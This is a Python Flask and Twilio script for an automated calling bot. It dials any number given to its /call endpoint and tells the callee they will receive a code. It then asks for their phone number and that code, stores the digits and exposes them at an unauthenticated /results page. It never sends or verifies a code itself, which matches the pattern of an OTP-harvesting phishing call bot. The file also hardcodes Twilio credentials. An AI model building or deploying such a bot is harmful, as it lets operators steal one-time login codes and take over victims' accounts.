from flask import Flask, request
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather
import os

app = Flask(__name__)

# In-memory storage (dictionary)
user_inputs = {}

# Twilio credentials (replace with env vars in production)
account_sid = 'AC708abc23ddee77e900ee7e67721a4252'
auth_token = '3b0938f0fe4411c44d3a58c41ba5eace'
twilio_number = '+17697596857'

client = Client(account_sid, auth_token)

@app.route("/")
def hello():
    return "✅ AI Call Bot is Live!"

# Step 1: Start the interaction
@app.route("/voice", methods=['GET', 'POST'])
def voice():
    response = VoiceResponse()
    gather = Gather(action="/gather_phone", input="dtmf", timeout=10, num_digits=20)
    gather.say("Please enter your phone number, followed by the pound key.", voice="Polly.Joanna")
    response.append(gather)
    response.redirect("/voice")
    return str(response)

# Step 2: Collect phone number and ask for code
@app.route("/gather_phone", methods=['POST'])
def gather_phone():
    digits = request.values.get('Digits', '')
    call_sid = request.values.get('CallSid', 'unknown')
    user_inputs[call_sid] = {"phone_number": digits}

    response = VoiceResponse()
    gather = Gather(action="/gather_code", input="dtmf", timeout=10, num_digits=10)
    gather.say("Thank you. You will now receive a code. Please enter the code, followed by the pound key.", voice="Polly.Joanna")
    response.append(gather)
    response.redirect("/gather_code")
    return str(response)

# Step 3: Collect verification code
@app.route("/gather_code", methods=['POST'])
def gather_code():
    digits = request.values.get('Digits', '')
    call_sid = request.values.get('CallSid', 'unknown')

    if call_sid in user_inputs:
        user_inputs[call_sid]["code"] = digits

    response = VoiceResponse()
    response.say("Thank you. Your responses have been recorded.", voice="Polly.Joanna")
    response.hangup()
    return str(response)

# Step 4: Trigger call
@app.route("/call", methods=['GET'])
def call():
    to_number = request.args.get("to", "+17697596857")
    call = client.calls.create(
        to=to_number,
        from_=twilio_number,
        url="https://ai-call-bot-couz.onrender.com/voice"
    )
    return f"📞 Calling {to_number}. Call SID: {call.sid}"

# Step 5: View stored responses
@app.route("/results", methods=['GET'])
def results():
    return user_inputs

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
